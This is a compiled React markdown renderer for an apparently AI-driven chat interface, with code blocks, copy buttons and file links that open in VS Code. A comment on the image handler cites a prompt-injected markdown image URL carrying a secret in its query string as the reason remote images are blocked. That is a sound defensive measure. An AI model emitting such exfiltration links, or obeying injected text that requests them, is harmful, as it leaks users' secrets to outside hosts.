import { jsx as _jsx, jsxs as _jsxs, Fragment as _Fragment } from "react/jsx-runtime";
import React, { createContext, useContext, useEffect, useMemo, useRef, useState } from 'react';
import ReactMarkdown from 'react-markdown';
import remarkGfm from 'remark-gfm';
import { Check, Copy } from 'lucide-react';
import { findFilePaths } from '../../../utils/fileLinks';
import { useOpenFile } from '../../../utils/openFile';
import { highlight, TOKEN_CLASS } from '../../../utils/highlight';
/**
 * Session directory file paths in the markdown resolve against. Without it (no session behind
 * the text) paths stay plain text.
 */
export const ChatFileContext = createContext(null);
const focusRing = 'focus-visible:outline-2 focus-visible:outline-blue-400';
const isMac = typeof navigator !== 'undefined' && /Mac/.test(navigator.platform);
const MOD = isMac ? 'Cmd' : 'Ctrl';
/** The whole text is one file path (`src/x.ts`, `/abs/y.md:12`), else null */
export function wholeFilePath(text) {
    const trimmed = text.trim();
    if (!trimmed || trimmed.length > 1024 || trimmed.includes('\n'))
        return null;
    const [match] = findFilePaths(trimmed);
    return match && match.start === 0 && match.end === trimmed.length ? match : null;
}
const hastText = (node) => !node
    ? ''
    : node.type === 'text'
        ? (node.value ?? '')
        : (node.children ?? []).map(hastText).join('');
/** Copy button with a short "Copied" confirmation */
export const CopyButton = ({ text, label = 'Copy', className = '', }) => {
    const [copied, setCopied] = useState(false);
    const timer = useRef(undefined);
    useEffect(() => () => window.clearTimeout(timer.current), []);
    return (_jsxs("button", { type: "button", onClick: () => {
            navigator.clipboard?.writeText(text).then(() => {
                setCopied(true);
                window.clearTimeout(timer.current);
                timer.current = window.setTimeout(() => setCopied(false), 1500);
            }, () => setCopied(false));
        }, className: `flex items-center gap-1 px-1.5 py-0.5 rounded text-[11px] text-gray-400 hover:text-white hover:bg-gray-800 ${focusRing} ${className}`, "aria-label": copied ? 'Copied' : label, children: [copied ? (_jsx(Check, { size: 12, "aria-hidden": true, className: "text-emerald-400" })) : (_jsx(Copy, { size: 12, "aria-hidden": true })), copied ? 'Copied' : label] }));
};
/** Fenced block: language label, copy button, code with syntax highlighting (utils/highlight.ts) */
const CodeBlock = ({ node }) => {
    const code = (node?.children?.[0] ?? undefined);
    const classes = code?.properties?.className;
    const language = (Array.isArray(classes) ? classes : [])
        .map(String)
        .find((c) => c.startsWith('language-'))
        ?.slice('language-'.length);
    const text = hastText(code).replace(/\n$/, '');
    const tokens = useMemo(() => highlight(text, language), [text, language]);
    return (_jsxs("div", { className: "my-2.5 rounded-md border border-gray-800 bg-gray-950 overflow-hidden", children: [_jsxs("div", { className: "flex items-center gap-2 h-7 pl-3 pr-1 border-b border-gray-800 bg-gray-900/70", children: [_jsx("span", { className: "font-mono text-[11px] text-gray-400", children: language || 'text' }), _jsx(CopyButton, { text: text, label: "Copy", className: "ml-auto" })] }), _jsx("pre", { className: "p-3 overflow-x-auto text-xs leading-relaxed text-gray-200", children: _jsx("code", { className: `font-mono${language ? ` language-${language}` : ''}`, children: tokens.map((t, i) => t.kind ? (_jsx("span", { className: TOKEN_CLASS[t.kind], "data-token": t.kind, children: t.text }, i)) : (t.text)) }) })] }));
};
/**
 * Inline code naming a file: Cmd/Ctrl-click opens it in VS Code, with Shift in its default app
 * (plain code where the transport cannot open files)
 */
const InlineCode = ({ children }) => {
    const cwd = useContext(ChatFileContext);
    const openFile = useOpenFile();
    const text = typeof children === 'string' ? children : '';
    const match = cwd && openFile ? wholeFilePath(text) : null;
    const base = 'font-mono text-[0.85em] px-1 py-0.5 rounded bg-gray-800/80 text-pink-200';
    if (!match || !cwd || !openFile)
        return _jsx("code", { className: base, children: children });
    return (_jsx("code", { className: `${base} cursor-pointer decoration-pink-300/40 decoration-dotted underline-offset-2 hover:underline`, title: `${MOD}-click: open in VS Code`, onClick: (e) => {
            if (!(e.metaKey || e.ctrlKey))
                return;
            e.preventDefault();
            void openFile(match.path, cwd, { editor: !e.shiftKey, line: match.line, col: match.col });
        }, children: children }));
};
const URL_SCHEME_RE = /^[a-z][a-z0-9+.-]*:/i;
/**
 * Web links open in a new tab; a link to a file path opens that file in VS Code (its text only,
 * where the transport cannot open files)
 */
const Link = ({ node: _node, href, children, ...rest }) => {
    const cwd = useContext(ChatFileContext);
    const openFile = useOpenFile();
    const match = cwd && href && !URL_SCHEME_RE.test(href) ? wholeFilePath(decodeURI(href)) : null;
    if (match && !openFile)
        return _jsx(_Fragment, { children: children });
    if (match && cwd && openFile)
        return (_jsx("a", { href: href, className: "text-blue-300 underline decoration-blue-300/40 hover:text-blue-200", title: `Open in VS Code (${MOD}+Shift: default app)`, onClick: (e) => {
                e.preventDefault();
                void openFile(match.path, cwd, {
                    editor: !e.shiftKey,
                    line: match.line,
                    col: match.col,
                });
            }, children: children }));
    return (_jsx("a", { ...rest, href: href, className: "text-blue-300 underline decoration-blue-300/40 hover:text-blue-200", target: "_blank", rel: "noreferrer", children: children }));
};
/** GFM rendered with Tailwind classes (no typography plugin in this app) */
const components = {
    h1: ({ node: _n, ...p }) => (_jsx("h1", { className: "text-lg font-semibold text-gray-50 mt-5 mb-2 leading-snug", ...p })),
    h2: ({ node: _n, ...p }) => (_jsx("h2", { className: "text-base font-semibold text-gray-50 mt-5 mb-2 pb-1 border-b border-gray-800 leading-snug", ...p })),
    h3: ({ node: _n, ...p }) => (_jsx("h3", { className: "text-sm font-semibold text-gray-100 mt-4 mb-1.5", ...p })),
    h4: ({ node: _n, ...p }) => _jsx("h4", { className: "text-sm font-medium text-gray-200 mt-3 mb-1", ...p }),
    // No remote image loads: a prompt-injected ![](https://host/?q=<secret>) would leak data
    img: ({ alt, src }) => (_jsxs("span", { className: "text-gray-400", title: typeof src === 'string' ? src : undefined, children: ["[image", alt ? `: ${alt}` : '', "]"] })),
    p: ({ node: _n, ...p }) => _jsx("p", { className: "my-2 leading-relaxed", ...p }),
    ul: ({ node: _n, className, ...p }) => (_jsx("ul", { className: className?.includes('contains-task-list')
            ? 'my-2 pl-1 space-y-0.5'
            : 'my-2 pl-5 list-disc space-y-0.5 marker:text-gray-500', ...p })),
    ol: ({ node: _n, ...p }) => (_jsx("ol", { className: "my-2 pl-6 list-decimal space-y-0.5 marker:text-gray-500", ...p })),
    li: ({ node: _n, className, ...p }) => (_jsx("li", { className: className?.includes('task-list-item') ? 'list-none flex items-start gap-2' : 'pl-0.5', ...p })),
    // GFM task list boxes are read-only state
    input: ({ node: _n, checked, type }) => type === 'checkbox' ? (_jsx("input", { type: "checkbox", checked: !!checked, readOnly: true, disabled: true, "aria-label": checked ? 'Done' : 'Open', className: "mt-[0.3em] shrink-0 accent-blue-500" })) : null,
    a: Link,
    blockquote: ({ node: _n, ...p }) => (_jsx("blockquote", { className: "my-2 pl-3 border-l-2 border-gray-700 text-gray-300", ...p })),
    hr: () => _jsx("hr", { className: "my-4 border-gray-800" }),
    table: ({ node: _n, ...p }) => (_jsx("div", { className: "my-2.5 overflow-x-auto rounded-md border border-gray-800", children: _jsx("table", { className: "w-full text-xs border-collapse", ...p }) })),
    thead: ({ node: _n, ...p }) => _jsx("thead", { className: "bg-gray-900", ...p }),
    tr: ({ node: _n, ...p }) => (_jsx("tr", { className: "border-b border-gray-800 last:border-b-0 even:bg-gray-900/40", ...p })),
    th: ({ node: _n, style, ...p }) => (_jsx("th", { className: "px-2.5 py-1.5 text-left font-medium text-gray-200 whitespace-nowrap", style: style, ...p })),
    td: ({ node: _n, style, ...p }) => (_jsx("td", { className: "px-2.5 py-1.5 align-top text-gray-300 tabular-nums", style: style, ...p })),
    pre: CodeBlock,
    code: ({ node: _n, className, children, ...rest }) => 
    // Fenced blocks carry a language class or a newline; everything else is inline code
    className || String(children).includes('\n') ? (_jsx("code", { className: `font-mono ${className ?? ''}`, ...rest, children: children })) : (_jsx(InlineCode, { children: children })),
};
export const ChatMarkdown = React.memo(({ text }) => (_jsx("div", { className: "text-sm text-gray-200 break-words [&>*:first-child]:mt-0 [&>*:last-child]:mb-0", children: _jsx(ReactMarkdown, { remarkPlugins: [remarkGfm], components: components, children: text }) })));
ChatMarkdown.displayName = 'ChatMarkdown';
